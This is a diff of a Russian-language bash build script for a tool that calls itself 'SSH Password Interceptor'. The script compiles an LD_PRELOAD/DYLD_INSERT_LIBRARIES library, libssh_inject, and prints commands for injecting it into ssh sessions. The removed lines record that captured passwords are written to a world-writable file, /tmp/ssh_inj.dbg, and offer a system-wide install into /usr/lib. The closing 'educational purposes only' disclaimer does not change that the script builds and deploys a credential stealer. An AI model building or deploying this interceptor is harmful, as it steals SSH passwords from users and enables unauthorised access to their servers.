@@ -1,84 +1,65 @@
 #!/bin/bash
 
-# Скрипт для компиляции и установки libssh_inject.so
+# SSH Password Interceptor - Скрипт компиляции
+# Версия 1.1.0
 
-# Проверка root прав
-if [ "$EUID" -ne 0 ]; then
-  echo "Для установки библиотеки требуются права администратора."
-  echo "Запустите скрипт с sudo: sudo ./compile.sh"
-  exit 1
-fi
-
-# Создаем директорию для исходников, если она отсутствует
-mkdir -p src/ssh_inject
-
-# Копируем исходные файлы
-cp state.hpp src/ssh_inject/
-cp ssh_inject.cpp src/ssh_inject/
-
-# Компилируем библиотеку
-echo "Компиляция libssh_inject.so..."
-g++ -shared -fPIC -o libssh_inject.so src/ssh_inject/ssh_inject.cpp -ldl
-
-if [ $? -ne 0 ]; then
-  echo "Ошибка компиляции! Проверьте наличие компилятора g++ и библиотеки libdl."
-  exit 1
-fi
-
-# Проверяем, что скомпилировалось успешно
-if [ ! -f libssh_inject.so ]; then
-  echo "Ошибка: файл libssh_inject.so не найден после компиляции."
-  exit 1
-fi
-
-echo "Библиотека успешно скомпилирована."
-
-# Настраиваем права доступа
-chmod 755 libssh_inject.so
-
-# Создаем лог-файл, если его нет
-touch /tmp/ssh_inj.dbg
-chmod 666 /tmp/ssh_inj.dbg
-
-# Предлагаем пользователю варианты установки
+echo "====================================="
+echo "   SSH Password Interceptor v1.1.0"
+echo "           Компиляция"
+echo "====================================="
 echo ""
-echo "Как вы хотите установить библиотеку?"
-echo "1. Скопировать в /usr/lib для системного использования"
-echo "2. Оставить в текущей директории для локального использования"
-echo "3. Не устанавливать, только скомпилировать"
-read -p "Выберите вариант (1-3): " install_choice
 
-case $install_choice in
-  1)
-    # Системная установка
-    cp libssh_inject.so /usr/lib/
-    echo "Библиотека установлена в /usr/lib/"
+# Проверка наличия необходимых файлов
+if [ ! -f "state.hpp" ] || [ ! -f "ssh_inject.cpp" ]; then
+    echo "Ошибка: не найдены исходные файлы (state.hpp, ssh_inject.cpp)."
+    echo "Убедитесь, что вы запускаете скрипт из директории с исходными файлами."
+    exit 1
+fi
+
+# Проверка наличия компилятора
+if ! command -v g++ &> /dev/null; then
+    echo "Ошибка: компилятор g++ не найден. Установите его с помощью:"
+    echo "sudo apt install g++ (для Debian/Ubuntu)"
+    echo "sudo yum install gcc-c++ (для CentOS/RHEL)"
+    exit 1
+fi
+
+# Определение операционной системы
+OS=$(uname -s)
+echo "Обнаружена операционная система: $OS"
+
+# Компиляция в зависимости от ОС
+if [ "$OS" = "Linux" ]; then
+    echo "Компиляция для Linux..."
+    g++ -Wall -fPIC -shared -ldl -o libssh_inject.so ssh_inject.cpp
+elif [ "$OS" = "Darwin" ]; then
+    echo "Компиляция для macOS..."
+    g++ -Wall -fPIC -shared -ldl -o libssh_inject.dylib ssh_inject.cpp
+else
+    echo "Предупреждение: неизвестная операционная система. Попытка компиляции для Linux..."
+    g++ -Wall -fPIC -shared -ldl -o libssh_inject.so ssh_inject.cpp
+fi
+
+# Проверка успешной компиляции
+if [ "$OS" = "Darwin" ] && [ -f "libssh_inject.dylib" ]; then
+    echo "Компиляция завершена успешно. Создан файл libssh_inject.dylib"
     echo ""
     echo "Для использования выполните команду:"
-    echo "LD_PRELOAD=/usr/lib/libssh_inject.so ssh user@server"
-    ;;
-  2)
-    # Локальная установка
-    echo "Библиотека оставлена в текущей директории: $(pwd)/libssh_inject.so"
+    echo "DYLD_INSERT_LIBRARIES=./libssh_inject.dylib ssh user@host"
+elif [ -f "libssh_inject.so" ]; then
+    echo "Компиляция завершена успешно. Создан файл libssh_inject.so"
     echo ""
-    echo "Для использования выполните команду:"
-    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
-    ;;
-  3)
-    # Только компиляция
-    echo "Библиотека скомпилирована: $(pwd)/libssh_inject.so"
+    echo "Для локального использования выполните команду:"
+    echo "LD_PRELOAD=./libssh_inject.so ssh user@host"
     echo ""
-    echo "Для использования выполните команду:"
-    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
-    ;;
-  *)
-    echo "Неверный выбор. Библиотека оставлена в текущей директории."
-    echo ""
-    echo "Для использования выполните команду:"
-    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
-    ;;
-esac
+    echo "Для установки в систему выполните:"
+    echo "sudo ./installer.sh"
+else
+    echo "Ошибка при компиляции. Проверьте сообщения об ошибках выше."
+    exit 1
+fi
 
 echo ""
-echo "Пароли будут сохраняться в файл: /tmp/ssh_inj.dbg"
-echo "Завершено!" 
+echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
+echo "Использование этого инструмента для несанкционированного доступа к системам"
+echo "является незаконным и неэтичным." 
